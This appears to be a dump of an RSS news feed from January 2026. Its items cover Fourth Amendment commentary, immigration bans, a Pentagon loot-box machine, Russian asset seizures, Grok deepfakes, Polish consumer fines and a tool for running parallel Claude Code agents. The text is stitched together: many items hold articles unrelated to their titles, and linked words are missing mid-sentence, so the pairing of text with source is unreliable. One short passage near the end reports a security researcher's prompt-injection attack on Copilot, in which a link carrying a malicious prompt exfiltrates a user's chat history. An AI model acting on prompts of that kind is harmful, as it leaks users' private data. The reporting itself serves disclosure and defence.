rummaging through their garbage would think they lacked reasonable grounds to confront the rummager. Making the decision all the stranger, California state law expressly protected a homeowner’s property rights in discarded trash. Id., at 43, 108 S.Ct. 1625. Yet rather than defer to that as evidence of the people’s habits and reasonable expectations of privacy, the Court substituted its own curious judgment.Even in a case like , which the government basically lost, Gorsuch still had dissented from the decision apparently because he felt the rationale was so poisoned by the post- reasoning that had subsequently emerged in so many cases since. As he wrote then:In the end, what do Smith and Miller add up to? A doubtful application of Katz that lets the government search almost whatever it wants whenever it wants. The Sixth Circuit had to follow that rule and faithfully did just that, but it’s not clear why we should.One unfortunate way that Fourth Amendment protection has been narrowed since  is in the context of electronic surveillance. In case after case it has been an uphill battle to challenge programs that give the government so much information about people’s lives. Indeed, as Gorsuch had earlier worried in , as long as the rule excusing an intrusion into what the Fourth Amendment would protect hinges on whether it invades a “reasonable expectation of privacy,” then there is effectively no protection to be had, because it simply isn’t a durable standard.  As his comment in this recent case about the “five or more Justices of this Court” harkened back to, it is subjectively dependent on the whims of the judges hearing the case.  As he also wrote then: Maybe, then, the Katz test should be conceived as a normative question. But if that’s the case, why (again) do judges, rather than legislators, get to determine whether society should be prepared to recognize an expectation of privacy as legitimate? Deciding what privacy interests should be recognized often calls for a pure policy choice, many times between incommensurable goods—between the value of privacy in a particular setting and society’s interest in combating crime. Answering questions like that calls for the exercise of raw political will belonging to legislatures, not the legal judgment proper to courts. See The Federalist No. 78, p. 465 (C. Rossiter ed. 1961) (A. Hamilton). When judges abandon legal judgment for political will we not only risk decisions where “reasonable expectations of privacy” come to bear “an uncanny resemblance to those expectations of privacy” shared by Members of this Court. Minnesota v. Carter, 525 U.S. 83, 97, 119 S.Ct. 469, 142 L.Ed.2d 373 (1998) (Scalia, J., concurring).The case this week was not an electronic surveillance case. But it is worth noting that Gorsuch is still holding fast to his insistence that the common law is still the correct lens to use to evaluate potential Fourth Amendment violations, and not the “reasonable expectation of privacy” lens that has emerged since .It should come as no surprise that our decision today might accord with the accumulated learning of the common law—just as it should come as no surprise that our application of the Fourth Amendment ought to be informed by the common law’s lessons rather than mere intuition. Because even if building off of  can sometimes result in even more protection, too often it has resulted in less, despite the Fourth Amendment’s articulated protection and history.For a period, to be sure, the miasma created by this Court’s Katz era led some to think the scope of the rights guaranteed by the Fourth Amendment depend on nothing more than current judicial instincts about “reasonable expectations of privacy.” See Carpenter, 585 U. S., at 394–395, 405–406 (GORSUCH , J., dissenting). But that confusion cannot last forever, for no one should think the rights of Americans hang on so thin a thread. Instead, and as Justice Story recognized, the Fourth Amendment is made of sturdier stuff, representing “the affirmance of a great constitutional doctrine of the common law.” 3 Commentaries on the Constitution of the United States 748 (1833).But his concurrence here may be more than just academic; it seems like it could be read to suggest that it may be time for litigants to take another swing at challenging the government’s warrantless electronic surveillance, especially given his callback to , a case that implicated it. Because this time, he is intimating, the Court should get the analysis right, to find such surveillance anathema under the Fourth Amendment, by using more timeless common law principles than the courts since  have been free to use.  Because even if the lower courts have been stuck with the “reasonable expectation of privacy” framework, the Supreme Court is not.  And this concurrence reads as a clear call for the Court to revisit it.Such challenges would also come not a moment too soon (assuming they are not already too late) given how the government’s data collection practices are now having immediate, direct, and horrific effect on people’s liberty writ large. It is not just personal information currently being seized but actual people, aided by the warrantless collection of their data. Or, in other words, and as it seems Gorsuch understands, what is happening is exactly what the Fourth Amendment was supposed to forestall. Thus it seems time for litigants to try again, to tee up before the Supreme Court the Fourth Amendment question that electronic surveillance implicates so that the Court can back up and try again, this time directing our subsequent Fourth Amendment jurisprudence down a different path from where it strayed post-, and instead lead to one where the rights of Americans, particularly with respect to their electronic data, no longer “hang on so thin a thread.” It seems there’s already at least one justice on board with finding that the Fourth Amendment precludes what the government has been doing of late, and probably more.Postscript: It is not the point of this post, but it is worth spending a moment to also digest Justice Sotomayor’s concurrence. In it she cautions that this decision should not be taken as a blanket rule that a police officer can always rush in without a warrant when they anticipate an emergency situation. Indeed, she notes, rushing in has the tendency to  the emergency, especially given the proliferation of firearms, and that danger should count heavily on the side of the ledger  the warrantless intrusion. Nevertheless, she continued, as in this case there can be factors counterbalancing those concerns and nevertheless justify the intrusion, which is why she joined the decision. But she was careful to emphasize in her concurrence that the rule here is not that all warrantless entrances in case of emergency are allowed; rather, the rule is that an assessment of whether there is an “objectively reasonable basis” for entering needs to always be made before such a warrantless intrusion can potentially be excused.That conclusion, on the facts of this case, does not mean it will always be objectively reasonable for officers responding to a mental-health crisis to make a warrantless entry. A different mix of information [in this case here] might have led to the conclusion that the officers’ entry itself would put the occupant (and officers) at a greater risk of escalation and serious injury. Because the “objectively reasonable basis” test, as reaffirmed by the Court today, demands careful attention to the case-specific risks that attend mental-health crises, and requires officers to act reasonably in response, I join the Court’s opinion in full.]]></content:encoded></item><item><title>Report: ICE Using Palantir Tool That Feeds On Medicaid Data</title><link>https://www.eff.org/deeplinks/2026/01/report-ice-using-palantir-tool-feeds-medicaid-data</link><author>Josh Richman</author><category>tech</category><enclosure url="https://www.eff.org/files/banner_library/surveillance-og-2.png" length="" type=""/><pubDate>Thu, 15 Jan 2026 20:30:48 +0000</pubDate><source url="https://www.eff.org/rss/updates.xml">Deeplinks</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Private Jet Billionaire Breaks Down Every Step in His Wealth Journey | The WSJ Money Interview</title><link>https://www.youtube.com/watch?v=MbsT2RC1wQo</link><author>The Wall Street Journal</author><category>yt</category><enclosure url="https://www.youtube.com/v/MbsT2RC1wQo?version=3" length="" type=""/><pubDate>Thu, 15 Jan 2026 20:00:16 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">The Wall Street Journal</source><content:encoded><![CDATA[Kenn Ricci is a pilot whose obsession over four decades with aviation and luxe travel made him a billionaire.

We've been building dev tools at 21st.dev and recently open-sourced 1Code (https://1code.dev), a local UI for Claude Code.Claude Code has been our go-to for 4 months. When Opus 4.5 dropped, parallel agents stopped needing so much babysitting. We started trusting it with more: building features end to end, adding tests, refactors. Stuff you'd normally hand off to a developer. We started running 3-4 at once. Then the CLI became annoying: too many terminals, hard to track what's where, diffs scattered everywhere.So we built 1Code.dev, an app to run your Claude Code agents in parallel that works on Mac and Web. On Mac: run locally, with or without worktrees. On Web: run in remote sandboxes with live previews of your app, mobile included, so you can check on agents from anywhere.
Running multiple Claude Codes in parallel dramatically sped up how we build features.What’s next: Bug bot for identifying issues based on your changes; QA Agent, that checks that new features don't break anything; Adding OpenCode, Codex, other models and coding agents. 
API for starting Claude Codes in remote sandboxes.Try it out! We're open-source, so you can just bun build it.
If you want something hosted, Pro ($20/mo) gives you web with live browser previews hosted on remote sandboxes. We’re also working on API access for running Claude Code sessions programmatically.We'd love to hear your feedback!]]></content:encoded></item><item><title>The 10 Greatest Directors</title><link>https://www.youtube.com/watch?v=bZsn4zXJTzk</link><author>The House of Tabula</author><category>yt</category><enclosure url="https://www.youtube.com/v/bZsn4zXJTzk?version=3" length="" type=""/><pubDate>Thu, 15 Jan 2026 19:20:36 +0000</pubDate><source url="https://www.youtube.com/channel/UCL5kBJmBUVFLYBDiSiK1VDw">The House of Tabula</source><content:encoded><![CDATA[This is a personal list of my favourite filmmakers of all time.

Thanks to a company called Lucky Box Vending, anyone passing through the center of American military power can pay to win a piece of randomized memorabilia from a machine dispensing collectibles.On Christmas Eve, a company called Lucky Box announced it had installed one of its vending machines at the Pentagon in a now-deleted . “A place built on legacy, leadership, and history—now experiencing the thrill of Lucky Box firsthand,” the post said. “This is a milestone moment for Lucky Box and we’re excited for this opportunity. Nostalgia. Pure Excitement.”A Lucky Box is a kind of gacha machine or lootbox, a vending machine that dispenses random prizes for cash. A person puts in money and the machine spits out a random collectible. Customers pick a “type” of collectible they want—typically either a rare Pokémon card, sports card, or sports jersey—insert money and get a random item. The cost of a spin on the Lucky Box varies from location to location, but it’s typically somewhere around $100 to $200. Pictures and advertisements of the Pentagon Lucky Box don’t tell us how much a box cost in the nation’s capitol and the company did not respond to 404 Media’s request for comment.Most of the cards and jerseys inside a Lucky Box vending machine are only worth a few dollars, but the company promises that every machine has a few of what it calls “holy grail” items. The Pentagon Lucky Box had a picture of a gem mint 1st edition Charizard Pokémon card on the side of it, a card worth more than $100,000. The company’s social media feed is full of people opening items like a CGC graded perfect 10  shadowless holo Pokémon card () or a 2023 Mookie Betts rookie card. Most people, however, don’t win the big prizes.Lucky Box vending machines are scattered across the country and mostly installed in malls. According to the store locator on its website, more than  are in Las Vegas. Which makes sense, because Lucky Boxes are a kind of gambling. These types of gacha machines are wildly popular in Japan and other countries in Southeast Asia. They’ve seen an uptick in popularity in the US in the past few years, driven by loosening restrictions on gambling and pop culture crazes such as Labubu.Task & Purpose first reported that the Lucky Box had since December 23, 2025. Pentagon spokesperson Susan Gough told 404 Media that, as of this writing, the Lucky Box vending machine was still installed in the Pentagon’s main food court.Someone took pictures of the thing and posted them to the . From there, the pictures made it onto most of the major military subreddits and various Instagram accounts like . After Task & Purpose reported on the presence of the Lucky Box at the Pentagon, Lucky Box deleted any mention of the location from its social media and the Pentagon location is not currently listed on the company’s store locator.  But it is, according to Gough, still there.In gaming, the virtual versions of these loot boxes are frowned upon. Seven years ago, games like Star Wars: Battlefront II were the center of a controversy around similar mechanics. At the time, it was common for video games to sell loot boxes to users for a few bucks. This culminated in an . A year ago, the developers of  a $20 million fine for selling loot boxes to teens under 16 without parental consent.The practice never went away in video games, but most major publishers backed off the practice in non-sports titles. Now, almost a decade later, the lootboxes have spread into real life and one of them is in the Pentagon.]]></content:encoded></item><item><title>DHS Expands Immigration Ban, Ensuring The Only Way An African Can Come To The US Is If We Bring Slavery Back</title><link>https://www.techdirt.com/2026/01/15/dhs-expands-immigration-ban-ensuring-the-only-way-an-african-can-come-to-the-us-is-if-we-bring-slavery-back/</link><author>Tim Cushing</author><category>tech</category><pubDate>Thu, 15 Jan 2026 19:07:08 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Ever since Trump took office and turned over immigration enforcement to someone who killed pets more often than she’s experienced moments of joy, the world has been shrinking. It America vs. everyone else at this point, with the Trump administration adding hefty amounts of imperialism to its heady blend of white Christian fascism. To be non-white is to be less than 2/3rds of a human, which is something I thought we might have moved past during the last 100 years or so. But everything old is new again, especially the stuff that should just be the relics of a shameful history, rather than the latest thing getting gilded by the administration’s ex-Fox News turd polishers. After an Afghan refugee shot some National Guard troops, Trump and his DHS placed an indefinite pause on immigration applications from a total of 19 countries, including (of course) Afghanistan, a country we hastily exited and turned over to the Taliban. For no discernible reason, another 20 countries have been added to the immigration ban. Unsurprisingly, none of these countries are mostly white. Here’s NPR with the details on the administration’s latest burst of xenophobia: U.S. Citizenship and Immigration Services, or USCIS, in a memo released Thursday, said it would pause the review of all pending applications for visas, green cards, citizenship or asylum from immigrants from the additional countries. The memo also outlines plans to re-review applications of immigrants from these countries as far back as 2021.The list, which is composed mostly of countries in Africa, includes Angola, Nigeria, Senegal, Tanzania and Zimbabwe.Wow. Imagine that. There’s a pattern developing here, and it’s exactly what you think it is. Here’s the full list of countries whose residents are subject to an indefinite ban on immigration applications:Afghanistan, Angola, Antigua and Barbuda, Benin, Burkina Faso, Burundi, Chad, Congo, Cuba, Dominica, Equatorial Guinea, Eritrea, Gabon, Haiti, Iran, Ivory Coast, Laos, Libya, Malawi, Mali, Mauritania, Myanmar, Niger, Nigeria, Senegal, Sierra Leone, Somalia, South Sudan, Sudan, Syria, Tanzania, The Gambia, Togo, Tonga, Turkmenistan, Venezuela, Yemen, Zambia, and ZimbabweHere’s what that looks like:So, we’ve got more than half of Africa on the blocklist. It will never reach 100% because South Africa is home to some pretty feisty white colonials the president seems to personally appreciate despite (or because of) their white nationalist leanings. Give it a few more months and the rest of that continent should be colored in. And while this government will pretend this is about national security and/or thwarting the international drug trade, it’s safe to assume any national security threat posed by autocrats Trump likes (Putin, Bukele, Orban, Erdogan) will be ignored to keep them, um, whitelisted. And any other nation that poses no threat one way or another but happens to be heavily populated by people with more skin pigmentation will find their immigration privileges suspended until at least January 2029.We’re no longer part of the free world. We’re a nation that’s hastily and deliberately backsliding into the worst version of itself, thanks to the irrational hatred of those in power. We may not have forgotten our history, but we’re being ruled by people who want to doom us to repeat it. ]]></content:encoded></item><item><title>Daily Deal: The Ultimate Microsoft Office Professional 2021 for Windows License + Windows 11 Pro Bundle</title><link>https://www.techdirt.com/2026/01/15/daily-deal-the-ultimate-microsoft-office-professional-2021-for-windows-license-windows-11-pro-bundle/</link><author>Daily Deal</author><category>tech</category><pubDate>Thu, 15 Jan 2026 19:02:08 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Microsoft Office 2021 Professional is the perfect choice for any professional who needs to handle data and documents.

In this video, historian Matt Lewis breaks down the brief history of Greenland, from its Indigenous Inuit origins and Norse settlements to Danish rule and modern self-governance. But history is only half the story. The real question is why the United States cares so much about Greenland right now.

As climate change melts Arctic ice, Greenland is no longer just the world’s largest island—it’s a strategic goldmine. New shipping routes, untapped rare earth minerals, and massive energy potential are turning the Arctic into the next great power competition zone. The U.S., China, and Russia are all watching closely, but America’s interest in Greenland goes back decades, from Cold War military bases to recent, very public attempts to increase influence.

We cannot do what we do without your support.Russia has taken control of the local operations of Polish-American company Canpack, one of the world’s largest producers of aluminium containers.Under a decree issued by President Vladimir Putin, Russian company Stalelement assumed “temporary external management” of Canpack’s subsidiaries in the country, reported Russian news agency TASS.Founded in 1992 in Kraków, Canpack operates manufacturing plants worldwide, including in Asia, the Middle East, North and South America, as well as various parts of Europe. Canpack in turn is part of Giorgi Global Holdings, a US company.At the same time as its action against Canpack, Russia also took control of the local assets of Danish firm Rockwool, the world’s largest producer of mineral wool insulation.The Russian authorities have not provided an official reason for their decision. However, Polish broadcaster RMF FM reports that such actions are increasingly targeting firms from countries deemed “unfriendly” by Russia. Poland has been one of Ukraine’s most vocal supporters.In a statement to Polish news website Onet, Canpack, which controlled around 30% of the Russian market for aluminium drinks containers, confirmed that it had been informed of the presidential decree to take control of its assets.“For 30 years, Canpack Group companies in Russia have operated in accordance with applicable law, fulfilling their obligations to employees and customers,” they added.“We are currently assessing the legal, operational and financial consequences of the actions of the Russian authorities and intend to take all possible measures to protect our rights, property ownership and business continuity.”Rockwool, whose shares fell 8% on Tuesday following reports of the seizures, said it would contest the Russian decision and “defend our legal rights under the bilateral investment treaty” but was “not optimistic about reversing the decision”.In response to the news of Russia’s action against Canpack, Krzysztof Lisek, a former MP from Poland’s main ruling party, Civic Coalition (KO), expressed surprise that the company had continued operating in Russia at all“How was it possible to be so naive as to believe that Russia is a state of law?” he wrote on social media. “Did the desire for profit cloud reason?”Canpack also features on Yale University’s list of Western companies that have continued to operate in Russia since the full-scale invasion of Ukraine.Another Polish firm on the list of clothing giant LPP, owner of brands such as Sinsay, Reserved and Cropp. Last year, it agreed to pay 1.8 million zloty (€420,000) to settle an investigation by Poland’s financial regulator into suspected failings in disclosure obligations during the sale of its Russian business

This isn’t some theoretical concern—as I detailed last week, Grok has been churning out sexualized images at an alarming rate, with users publicly generating “undressing” content and worse, in many cases targeting real women and girls. UK Technology Secretary Liz Kendall told Parliament that Ofcom could impose fines up to £18 million or seek a court order to block X entirely if violations are found.Enter Sarah B. Rogers, the Trump-appointed Under Secretary of State for Public Diplomacy, who decided this was the perfect moment to threaten a close US ally. In an interview with GB News, Rogers declared:I would say from America’s perspective … nothing is off the table when it comes to free speech. Let’s wait and see what Ofcom does and we’ll see what America does in response.She went further, accusing the British government of wanting “the ability to curate a public square, to suppress political viewpoints it dislikes” and claiming that X has “a political valence that the British government is antagonistic to.”This is weapons-grade nonsense, and Rogers knows it.The UK isn’t investigating X because they don’t like Elon Musk’s politics. They’re investigating because Grok is being used to create sexualized deepfakes of real people without consent, including minors. Unless Rogers is prepared to stand up and argue that generating non-consensual sexualized imagery of real people—including children—is somehow quintessential “conservative speech” that the US must defend, she’s deliberately mischaracterizing what’s happening here. Is that really the hill the State Department wants to die on? That deepfake NCII is conservative speech?As UK Prime Minister Keir Starmer’s spokesperson put it:“It’s about the generation of criminal imagery of children and women and girls that is not acceptable. We cannot stand by and let that continue. And that is why we’ve taken the action we have.”But here’s where the hypocrisy becomes truly spectacular: just this week, the Republican-led Senate unanimously passed the DEFIANCE Act for the second time. This legislation would create a federal civil cause of action allowing victims of non-consensual deepfake intimate imagery to sue the producers of such content. No matter what you think of that particular bill (I have my concerns about the specifics of how the bill works), it’s quite something when you have the State Department’s mafioso-like threat being issued to the UK if they take  action to respond to what’s happening on X at the same time the MAGA-led US Senate is voting unanimously to move forward on a bill that could have a similar impact.So let’s review the US government’s position:Banning an entire social media platform because China  access data (that they can already buy from data brokers anyway)? Perfectly fine, rush it through SCOTUS.Allowing victims to sue over non-consensual sexualized deepfakes? Great idea, unanimous Senate support.Another country investigating whether a platform violated laws against generating sexualized deepfakes of minors? UNACCEPTABLE CENSORSHIP, NOTHING IS OFF THE TABLE.The MAGA mindset in a nutshell: performative nonsense when it fits within a certain bucket (in this case the “OMG Europeans censoring Elon”) no matter that it conflicts with stated beliefs elsewhere.It’s important to consider all of this in light of the whole TikTok ban fiasco. When the Supreme Court blessed Congress’s decision to ban an app based on vague national security concerns—concerns so urgent that the Biden administration immediately decided not to enforce the ban after winning in court and which Trump has continued to not enforce for an entire year—America effectively torched its moral authority to criticize other countries for restricting platforms.As I wrote when that ruling came down, we essentially said it’s okay to create a Great Firewall of America. We told the world that if you claim “national security” loudly enough, with sufficient “bipartisan support,” you can ban whatever app you want, First Amendment concerns be damned. Chinese officials have pointed to the US’s TikTok ban to justify their own internet restrictions, and now we’re handing authoritarian regimes another gift: the US will threaten retaliation if you try to enforce laws against platforms generating sexualized imagery of children.When you blow up the principle that countries shouldn’t ban apps based on content concerns, you don’t get to suddenly rediscover those principles when it’s your billionaire’s app on the chopping block.And make no mistake about what Rogers is really defending here. Grok continues to generate sexualized content at scale. Elon Musk continues running X like an edgelord teenager who knows he’s rich enough to avoid consequences, and women—especially young women—continue facing harassment and abuse via these tools.The State Department’s threats aren’t about defending free speech. They’re about protecting Musk’s business interests. It’s about maintaining the double standard that got us here: American companies can do whatever they want globally, but foreign companies operating in America face existential threats for far less.The UK is investigating potential violations of laws against generating sexualized imagery of minors and non-consenting adults. If the State Department thinks that’s “censorship,” they should explain why the Senate just voted unanimously to let victims sue over exactly that conduct.Look, the UK’s investigation may or may not lead anywhere. Ofcom may find violations, or it may not. They may impose fines, or they may not. They may seek to block X, or they may not. But the one thing the US government absolutely cannot do with a straight face is threaten them for even considering it.You don’t get to ban TikTok and then act outraged when other countries contemplate similar actions against American companies. You don’t get to pass unanimous legislation allowing lawsuits over deepfake NCII while your State Department calls investigations into that same deepfake NCII “censorship.” You don’t get to spend years claiming that national security justifies any restriction on platforms and then suddenly discover that “free speech” means other countries can’t enforce their laws.There are no principles here, only sheer abuse of power. And Sarah Rogers’s threat to the UK makes that abundantly clear: the rules we claimed justified banning TikTok apparently only apply when we’re the ones doing the banning.]]></content:encoded></item><item><title>Inside the &apos;Woman, Life, Freedom&apos; protest movement in Iran | DW Documentary</title><link>https://www.youtube.com/watch?v=us8B_KdcB3c</link><author>DW Documentary</author><category>yt</category><enclosure url="https://www.youtube.com/v/us8B_KdcB3c?version=3" length="" type=""/><pubDate>Thu, 15 Jan 2026 17:01:35 +0000</pubDate><source url="https://www.youtube.com/channel/UCW39zufHfsuGgpLviKh297Q">DW Documentary</source><content:encoded><![CDATA[Filmed in secret, this documentary is a behind-the-scenes look at the "Woman, Life, Freedom” uprising in Iran. The story begins a few weeks after the death of Jina Mahsa Amini, a young Kurdish student who died on 16 September 2022.

She had allowed a few strands of hair to escape from her veil. Members of the Iranian morality police beat her so severely that she died of her injuries. The regime in Tehran has denied all responsibility for her death, which triggered nationwide mass protests under a slogan that echoed all around the world: "Woman, Life, Freedom”.

Iranian filmmaker Shorresh Afkari filmed in secret, smuggling the footage out of the country to a colleague in France. His documentary gives a voice to people who, like large sections of the Iranian population, have run out of strength and patience.

For example, the film observes a young couple who dream of being able to express their love openly and in complete freedom. We also meet a taxi driver, who ends up in prison as a bitter opponent of the regime. His mother tries to protect him at all costs. A painter continues to practise her art despite censorship; a doctor secretly treats demonstrators. A young man is prepared to do anything for cash, even sell one of his kidneys. Just like men who dare to protest, women who show their hair in public and publicly oppose the regime still face harsh punishment, including the death penalty. For this reason, many interviewees speak off-camera to protect their anonymity.

The widespread protests and mass demonstrations that began shortly before the end of 2025 and continue to this day show that large parts of the population no longer support the regime in Tehran — a regime that continues to respond with brutality against the people of Iran.

Finally! But it's season one you say? You're right! Rarely are the first seasons of shows outright exceptional (with some outright exceptions) most times they're good enough to pass muster, until they find stable footing. Deep Space Nine is no different! Light years ahead of the awkward first season of TNG, DS9 slides right into it's groove early on. While there are lots of isolated TNG-esque one-off story lines and some early character developing episodes, DS9 season one is a solid layer of quality "paste" as Rich Evans so eloquently puts it. Rich and Mark talk briefly about each episode, pausing to pick favorites along these way. Watch them two old, confused, boring, elderly, genXer scumbags wax nostalgic for quaint old television before the time of woke nightmare sauce spilling out of every eyeball. Before shows made it based on viewership ratings and not streaming service fodder for animal troughs of marketable IP's and stock market shareholder data portfolios for investors. In addition to the Matlock reboot for the olds, we've got this over-produced glossy, fast moving, fart-filled, hip gen-zers (not watching Star Trek I can assure you) tiktok framed clips and nightmare fuel. This embarrassing attempt by old cracker boomer producers to create a program to appeal to Z's that not a single one will take the time to watch. out-of-touch,  buzz-worthy hip-hop, busin' zazz dancin' kidz in Starfleet, bouncing pronouns off the shields as they flubba dubb to the latest crunchy zen-dash touch grass brah.

--

Inspired by a king’s visit, a trio of siblings began building a palace, traveling far and wide to collect rare jewels, seeds, and marble. A holy man stopped by and told them of a Magic Mountain, east of north and north of east, where they’d find their most meaningful treasures. But, he said, only a true hero could complete the journey. Malay Bera shares the Bengali tale of Kiranmala's quest.

Lesson by Malay Bera, directed by Héloïse Dorsan-Rachet.

Although this folktale exists in multiple oral variants across the Bengali-speaking world, this video is based on a variant akin to the better-known literary version, “Kironmala", from Thakurmar Jhuli (1907), an anthology of Bengali folktales collected by Dakshinaranjan Mitra Majumdar in the early 20th century.

Why do people believe the things they do? We like to think that we are rational, that what we believe is true. But often we come to our beliefs, unknowingly, as a product of our particular ‘belief systems’. How do belief systems work their credulous magic? What principles enable belief systems to influence individuals and commandeer groups?

What would it mean for God to have a ‘nature’? A nature is a deep essence that defines a particular way of being. Would God’s nature characterize, limit or even control God? Could contradictions among aspects of God’s supposed nature emerge that might deny God? Can we know anything of what such an ineffable supreme being might be like?

Wikipedia's content remains freely available under a Creative Commons license, but the Enterprise program charges for faster, higher-volume access to the data. The foundation did not disclose the financial terms of the deals.The new partners join Google, which signed a deal with Wikimedia Enterprise in 2022, as well as smaller companies like Ecosia, Nomic, Pleias, ProRata, and Reef Media.

We cannot do what we do without your support.Prime Minister Donald Tusk says Poland has no plans to join other European countries in sending military personnel to Greenland amid ongoing concern over US President Donald Trump’s efforts to gain control over the island.Tusk warned that, if Trump takes military action against Greenland, it would be “On Thursday, Germany, Sweden, France and Norway, all members of NATO, confirmed that they were dispatching small military contingents to Greenland, which is part of the Kingdom of Denmark, to participate in joint exercises with their Danish counterparts.At a press conference later in the day, Tusk was asked if Poland would follow their example. “No, we have no plans to send Polish troops to Greenland,” he responded. Asked more broadly about the situation, Tusk said that “potential US military intervention would be a disaster”.It would mark the end of “aThe Polish prime minister said that he “does not want to speculate on whether [a US invasion] is possible”. But, “unfortunately, no scenario can be ruled out”, especially “gHe noted that, during his previous talks with Trump, the US president “repeatedly made it clear that unpredictability and surprise, especially of allies, were his preferred methods”.If the existing transatlantic alliance does collapse, said Tusk, “we would have to prepare to build a security architecture with those who remain loyal to the project of the West as a community”.Tusk, a former president of the European Council, leads a centrist, pro-EU government. Both he and other figures in his administration have been critical of Trump in the past, though they have sought to work with the US president since his return to the White House.By contrast, Poland’s president, Karol Nawrocki, who is aligned with the right-wing opposition, has been a close ally of Trump. Asked this week by the BBC about the situation surrounding Greenland, Nawrocki said that “discussions should remain a matter between the prime minister of Denmark and President Trump”.That marked a contrast to Tusk, who last week co-authored a statement with Denmark’s prime minister and the leaders of the UK, Germany, France, Italy and Spain warning Trump against violating Greenland’s sovereignty.While Poland’s government, led by Tusk, is in charge of the day-to-day running of foreign and defence policy, the president serves as commander-in-chief of the armed forces and also has a voice in Poland’s international relations.

We cannot do what we do without your support.Poland’s consumer protection authority has fined fashion retailer Zalando and shopping platform Temu a combined total of almost 37 million zloty (€8.8 million) for giving misleading information on discounts.The Office of Competition and Consumer Protection (UOKiK) found that the two online giants had failed to comply with consumer protection rules in the European Union that have, since 2023, required businesses advertising promotions to disclose the lowest price charged for the same product over the last 30 days and calculate any discount based on that price.According to UOKiK, Zalando manipulated this 30-day reference price to make promotions appear more attractive, while the information was not always available on Temu.Zalando was fined nearly 31 million zloty, while Temu received a fine of close to 6 million zloty. Both companies can appeal the decisions, and Zalando has said that it intends to do so.“Businesses are responsible for correctly informing consumers about discounts and promotions. Presenting price increases as bargains and the selective, manipulative display of discounted prices must end,” UOKiK’s president, Tomasz Chróstny, said in a statement.According to UOKiK, Zalando calculated discounts against “initial” or “regular” prices rather than the lowest price in the previous 30 days, exaggerating the scale of promotions.“Irregularities on the Zalando website included failure to disclose the lowest price from the 30 days before the discount and incorrectly stating the discount amount in various places on the website,” found UOKiK.“Despite being repeatedly brought to its attention, the company did not change the actions in question during the proceedings,” it added.The watchdog also cited consumer complaints alleging that Zalando marked unchanged prices as promotions and inflated reference prices, making discounts appear larger than they were.“Today I discovered that the shoes I bought yesterday at Zalando for 130 zloty instead of 259 zloty are now 255 zloty, and are theoretically 20% off, because according to the store, the lowest price in the last 30 days is 319 zloty, which is a blatant lie,” read one complaint.UOKiK is also pursuing separate proceedings against Zalando for allegedly failing to provide information requested during the investigation, which could result in a fine of up to 3% of turnover.The Berlin-based Zalando Group, which operates in multiple markets, reported revenue of €10.6 billion in 2024 but did not disclose how much came from its Polish business.Zalando rejected UOKiK’s assessment, saying it had answered all of the regulator’s questions and had “immediately implemented all requirements presented to us by the UOKiK, in accordance with the authority’s guidelines, based on the regulations in force in Poland”.“We are currently analysing the decision of UOKiK’s president and intend to defend our position by appealing against the decision in court,” said the firm, quoted by Polish Press Agency (PAP).UOKiK said, meanwhile, that Ireland-based Whaleco Technology Limited, which operates Temu’s interface, failed to consistently display the lowest price from the previous 30 days, leaving customers unable to assess the true size of discounts.The watchdog also cited misleading reference prices, inconsistent labelling across product variants and repeated changes to the 30-day reference price during promotions.In a statement cited by Business Insider Polska, Temu said it had “cooperated fully with the Office of Competition and Consumer Protection, taken the comments into account and made the necessary changes”.That cooperation was confirmed by the office itself, which said Temu has since discontinued the contested practices and now presents consistent information about promotions on its website.UOKiK also revealed that it is investigating six other firms over their compliance discounting rules: electronics chain MediaMarkt, cosmetics firm Sephora, delivery app Glovo, petrol supplier Shell Polska, fashion marketplace AzaGroup, and Jeronimo Martins Polska, owner of Poland’s biggest supermarket chain, Biedronka.

Across the United States, police departments are deploying automated license plate readers, facial recognition tools, and predictive systems that quietly log the daily movements of millions of people. These tools promise efficiency and safety, but critics argue that they represent a form of warrantless mass surveillance, and raise deep constitutional questions about privacy, accountability, and the limits of government power in the digital age.Michael Soyfer is an attorney at the Institute for Justice, a nonprofit public interest law firm focused on defending individual rights.

This full Malcolm X documentary explores his life, ideas and legacy, from his troubled early years and prison conversion to his rise as a leading voice in the civil rights movement and the emergence of Black Power.

In this in depth biographical documentary, we trace how Malcolm X transformed from an outspoken Nation of Islam minister into a global human rights activist who challenged America’s racial order. Featuring archival footage, expert historical analysis and detailed biography, the film examines his most important speeches, his break with the Nation of Islam, his pilgrimage to Mecca, and his evolving views on race, Black nationalism and unity.

We investigate how Malcolm X’s radical message helped shape the Black Power movement, influenced groups like the Black Panther Party, and forced America to confront its history of racism, segregation and violence. This Malcolm X biography places his story within the wider struggle for Black freedom and civil rights in the 1950s and 1960s.

If you are interested in Black history, racial politics and the people who changed the world, this Malcolm X and Black Power documentary offers a comprehensive, historically grounded account of a revolutionary life.

Studies are being called into question by scientists who claim they were tainted by contamination and false positives. What that basically means is that until more robust tests are completed, your actual risk from microplastics is TBD.

Does all of this mean that we can't trust scientific findings? Not so fast.

The net effect of their multistage attack was that they exfiltrated data, including the target’s name, location, and details of specific events from the user’s Copilot chat history. The attack continued to run even when the user closed the Copilot chat, with no further interaction needed once the user clicked the link, a legitimate Copilot one, in the email. The attack and resulting data theft bypassed enterprise endpoint security controls and detection by endpoint protection apps.“Once we deliver this link with this malicious prompt, the user just has to click on the link and the malicious task is immediately executed,” Varonis security researcher Dolev Taler told Ars. “Even if the user just clicks on the link and immediately closes the tab of Copilot chat, the exploit still works.”]]></content:encoded></item><item><title>“Poland open to its ethnic and religious minorities,” declares president at meeting of community leaders</title><link>https://notesfrompoland.com/2026/01/14/poland-open-to-ethnic-and-religious-minorities-declares-president-at-meeting-of-community-leaders/</link><author>Daniel Tilles</author><category>news</category><pubDate>Wed, 14 Jan 2026 21:12:37 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.President Karol Nawrocki has hosted a meeting with representatives of Poland’s ethnic and religious minorities. Referring to Poland’s multicultural past, he insisted that the country remains open to all communities.It is an annual tradition for the Polish president to invite leaders of the country’s traditional minority groups to the presidential palace in January. On Wednesday, Nawrocki, a conservative who took office in August last year, upheld that custom.Among those to attend were representatives of the Jewish and Muslim communities; leaders of various Christian denominations, including Protestant, Greek Catholic and 